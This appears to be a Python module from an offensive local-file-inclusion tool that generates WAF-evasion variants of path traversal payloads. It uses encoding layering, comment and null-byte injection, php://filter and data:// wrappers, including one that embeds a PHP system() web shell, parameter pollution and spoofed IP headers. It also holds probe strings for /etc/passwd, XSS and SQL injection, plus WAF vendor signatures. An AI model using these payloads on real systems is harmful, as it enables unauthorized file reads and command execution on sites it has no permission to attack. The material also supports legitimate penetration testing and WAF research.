"""WAF evasion and bypass techniques for LFI"""

import re
import random
from urllib.parse import quote, quote_plus
from .rich_output import print_technique_header, print_payload_test


class WafBypass:
    """Collection of WAF evasion techniques"""

    @staticmethod
    def add_junk_parameters(payload, num_params=3):
        """Add random junk GET parameters to evade signature detection"""
        junk_params = []
        param_names = ["debug", "test", "tmp", "cache", "session", "id", "key", "token"]
        param_values = ["1", "0", "true", "false", "null", "empty", "test"]

        for _ in range(random.randint(1, num_params)):
            name = random.choice(param_names) + str(random.randint(1, 999))
            value = random.choice(param_values)
            junk_params.append(f"{name}={value}")

        separator = "&" if "?" in payload else "?"
        return payload + separator + "&".join(junk_params)

    @staticmethod
    def comment_injection(payload):
        """Insert comments and whitespace to break WAF patterns"""
        variations = []

        # PHP comment injection
        if "../" in payload:
            variations.extend(
                [
                    payload.replace("../", "..//*comment*/../"),
                    payload.replace("../", "../#comment\n../"),
                    payload.replace("../", "../<?php /*comment*/ ?>../"),
                ]
            )

        # Add whitespace variations
        variations.extend(
            [
                payload.replace("/", "/ "),
                payload.replace("..", ". ."),
                payload.replace("=", " = "),
            ]
        )

        return variations

    @staticmethod
    def protocol_confusion(payload):
        """Use different protocols to confuse WAF detection"""
        variations = []

        # File protocol variations
        if payload.startswith("/"):
            variations.extend(
                [
                    f"file://{payload}",
                    f"file://localhost{payload}",
                    f"file://127.0.0.1{payload}",
                ]
            )

        # PHP wrapper confusion
        variations.extend(
            [
                f"php://filter/read=convert.base64-encode/resource={payload}",
                f"php://filter/convert.iconv.utf-8.utf-16/resource={payload}",
                f"data://text/plain,<?php system($_GET['cmd']); ?>&cmd=cat {payload}",
            ]
        )

        return variations

    @staticmethod
    def encoding_layering(payload):
        """Apply multiple encoding layers"""
        variations = []

        # Double URL encoding
        variations.append(quote(quote(payload, safe=""), safe=""))

        # Mixed encoding
        encoded_payload = ""
        for char in payload:
            if char in ["/", ".", "\\"]:
                # Randomly choose encoding method
                choice = random.randint(1, 3)
                if choice == 1:
                    encoded_payload += quote(char)
                elif choice == 2:
                    encoded_payload += f"%{ord(char):02x}"
                else:
                    encoded_payload += char
            else:
                encoded_payload += char
        variations.append(encoded_payload)

        # Unicode encoding
        unicode_payload = ""
        for char in payload:
            if random.choice([True, False]) and ord(char) < 128:
                unicode_payload += f"\\u{ord(char):04x}"
            else:
                unicode_payload += char
        variations.append(unicode_payload)

        return variations

    @staticmethod
    def path_obfuscation(payload):
        """Obfuscate file paths to bypass path-based detection"""
        variations = []

        if "../" in payload:
            # Add redundant path segments
            variations.extend(
                [
                    payload.replace("../", ".././"),
                    payload.replace("../", "../foo/../"),
                    payload.replace("../", "../bar/baz/../../"),
                    payload.replace("../", ".././"),
                ]
            )

        # Case manipulation for non-case-sensitive filesystems
        if payload.lower() != payload:
            variations.append(payload.swapcase())

        # Add null bytes and special characters
        variations.extend(
            [
                payload + "%00",
                payload + "%00.jpg",
                payload + "?",
                payload + "#",
            ]
        )

        return variations

    @staticmethod
    def http_parameter_pollution(payload, param_name="file"):
        """Use HTTP Parameter Pollution to confuse WAF"""
        variations = []

        # Duplicate parameters with different values
        variations.extend(
            [
                f"{param_name}=innocent.txt&{param_name}={payload}",
                f"{param_name}={payload}&{param_name}=innocent.txt",
                f"{param_name}[]=innocent.txt&{param_name}[]={payload}",
            ]
        )

        return variations

    @staticmethod
    def content_type_bypass():
        """Return headers that might bypass content-type based WAF rules"""
        bypass_headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Forwarded-Host": "localhost",
        }
        return bypass_headers

    @staticmethod
    def generate_waf_bypass_variants(payload):
        """Generate all possible WAF bypass variants for a payload"""
        all_variants = set()
        all_variants.add(payload)

        # Apply each bypass technique
        all_variants.update(WafBypass.comment_injection(payload))
        all_variants.update(WafBypass.protocol_confusion(payload))
        all_variants.update(WafBypass.encoding_layering(payload))
        all_variants.update(WafBypass.path_obfuscation(payload))

        # Convert back to list and limit to reasonable number
        variant_list = list(all_variants)
        return variant_list[:20]  # Limit to prevent excessive requests

    @staticmethod
    def test_waf_detection(target_url, test_payloads=None):
        """Test if a WAF is present by sending known malicious payloads"""
        if not test_payloads:
            test_payloads = [
                "../../../../etc/passwd",
                "../../../windows/system32/drivers/etc/hosts",
                "<?php phpinfo(); ?>",
                "<script>alert('xss')</script>",
                "' OR '1'='1",
            ]

        print_technique_header("WAF Detection Test")

        # This would need to be integrated with the main attack function
        # Return basic info for now
        return {
            "waf_detected": False,
            "waf_type": "unknown",
            "recommended_bypasses": ["encoding_layering", "comment_injection"],
        }


class WafSignatures:
    """Known WAF signatures and detection patterns"""

    # Common WAF error messages/patterns
    WAF_SIGNATURES = {
        "cloudflare": [
            "cloudflare",
            "cf-ray",
            "attention required",
            "why have i been blocked",
        ],
        "aws_waf": ["aws waf", "x-amzn-requestid", "access denied"],
        "akamai": ["akamai", "reference #", "access denied"],
        "incapsula": ["incapsula", "visid_incap", "request unsuccessful"],
        "sucuri": ["sucuri", "cloudproxy", "access denied"],
        "mod_security": ["mod_security", "not acceptable", "406 not acceptable"],
    }

    @classmethod
    def detect_waf(cls, response_text, response_headers):
        """Detect WAF type based on response content and headers"""
        response_text_lower = response_text.lower()
        headers_str = str(response_headers).lower()

        for waf_name, signatures in cls.WAF_SIGNATURES.items():
            for signature in signatures:
                if signature in response_text_lower or signature in headers_str:
                    return waf_name

        return None
